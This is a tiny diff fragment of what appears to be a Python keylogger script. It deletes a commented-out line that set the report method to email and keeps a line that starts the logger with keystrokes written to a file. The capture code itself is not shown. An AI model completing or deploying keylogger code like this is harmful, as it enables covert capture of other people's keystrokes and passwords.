@@ -115,6 +115,5 @@ class Keylogger:
 
 
 if __name__ == "__main__":
-    #keylogger = Keylogger(report_method="email")
     keylogger = Keylogger(report_method="file")
     keylogger.start()
